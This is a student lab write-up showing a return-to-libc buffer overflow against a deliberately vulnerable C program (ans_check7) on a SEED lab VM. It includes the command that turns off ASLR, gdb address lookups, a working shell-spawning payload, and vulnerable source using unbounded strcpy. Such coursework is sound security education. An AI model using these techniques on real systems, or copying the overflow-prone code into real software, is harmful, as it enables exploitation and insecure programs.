## Buffer overflow attack(turn on ASLR, turn off NX)

## Overview
* So far, in lab3 & lab4, we did a buffer overflow attack using stack executable.
* But it's not the case in real situation. Linux systems usually make it impossible to run programs from stack memory.
* We injected malicious code in the stack from previous practice, but in this practice, we're going to call system function which is in the libc library.
* Most programs, including ans_check7, rely on the C standard library, libc. The return-to-libc method we discussed in the lecture explains how we can pass command line arguments to the system() function in the linked libc library to spawn a new shell, without requiring the ability to execute code on the stack.
* With this senario, we're going to make a payload like below

## PAYLOAD
+ Payload = PADDING + build-string-payload + &system() + &exit_path + &cmd_string
+ Note that this time, we're building our own string!

## Before get started
+ Make sure that the ASLR is turned off.
```
[02/23/22]seed@VM:Byeongchan$ cat /proc/sys/kernel/randomize_va_space 
2
[02/23/22]seed@VM:Byeongchan$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
[02/23/22]seed@VM:Byeongchan$ cat /proc/sys/kernel/randomize_va_space 
0
[02/23/22]seed@VM:Byeongchan$

```

## Steps
1. Find out how many bytes we need for the padding.
2. Find out the address of the system function
3. Find out the address of the exit function
4. Find out the address of the '/bin/bash' string in the env variables
5. Make the payload and execute

### Step1 - Find out how many bytes we need for the padding.
+ I found the 54 bytes are needed for the padding using exit function
+ If you're not sure what it does, look back previous practice
```
[02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
```


### Step2 - Find out the address of the system function
+ Address of system() : 0xb7da4da0
+ I tried to find the system in the program, but it ended with ‘00’ so I tried to find another one using gdb.
```
[02/23/22]seed@VM:Byeongchan$ objdump -D ans_check7 | grep system
08048420 <system@plt>:
 8048639:	e8 e2 fd ff ff       	call   8048420 <system@plt>
[02/23/22]seed@VM:Byeongchan$
```
+ This time, I used gdb method.
```
[02/23/22]seed@VM:Byeongchan$ gdb -q ans_check7
Reading symbols from ans_check7...done.
gdb-peda$ run
Starting program: /home/seed/lab5/ans_check7 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
Usage: /home/seed/lab5/ans_check7 <answer>
[Inferior 1 (process 3129) exited normally]
Warning: not running or target is remote
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7da4da0 <__libc_system>
gdb-peda$
```

### Step3 - Find out the address of the exit function
+ Address of exit() : 0xb7d989d0
+ This time, I just using gdb method very first.
```
[02/23/22]seed@VM:Byeongchan$ gdb -q ans_check7
Reading symbols from ans_check7...done.
gdb-peda$ run
Starting program: /home/seed/lab5/ans_check7 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
Usage: /home/seed/lab5/ans_check7 <answer>
[Inferior 1 (process 3147) exited normally]
Warning: not running or target is remote
gdb-peda$ p exit
$1 = {<text variable, no debug info>} 0xb7d989d0 <__GI_exit>
```

### Step4 - Find out the address of the '/bin/bash' string in the env variables
+ The address of cmd_string: 0xbffff0d3
+ Repeatable note is here
```
[02/23/22]seed@VM:Byeongchan$ gcc find_var.c -o find_var
[02/23/22]seed@VM:Byeongchan$ find_var SHELL
0xbffff0d3
[02/23/22]seed@VM:Byeongchan$ echo $SHELL
/bin/bash
[02/23/22]seed@VM:Byeongchan$
```

### Step5 - Make the payload and execute
+ The payload I made is shown below
+ &system:  0xb7da4da0 <__libc_system>
+ &exit_path: b7d989d0 <__GI_exit>
+ &cmd_string: 0xbffff0d3, cmd_string address
```
$(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
```
+ However, there is one problem executing the payload with the program
+ The payload I made above failed with ‘/bash’ not found error. And I knew the meaning of it, because find_var program returned the address of ‘SHELL’ text a little bit different. So, I needed to make adjustment a bit. 
+ First, I tried 3 less bytes and I also failed with ‘bin/bash’ not found. 
+ Second, I tried 4 less bytes and I got a new shell.
+ Below is my successful execution command.
```
[02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
```
![lab5_1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_1.png)


## ans_check7.c
+ Compile this program with option like this : gcc -g -m32 -fno-stack-protector ans_check7.c -o ans_check7
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[38];

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }

  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
  system("/bin/date");
}
```

## find_var.c
+ This program shows the address of 'SHELL' env variable.
```
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
   if(!argv[1])
  	exit(1);
   printf("%p\n", getenv(argv[1]));
   return 0;
}
```
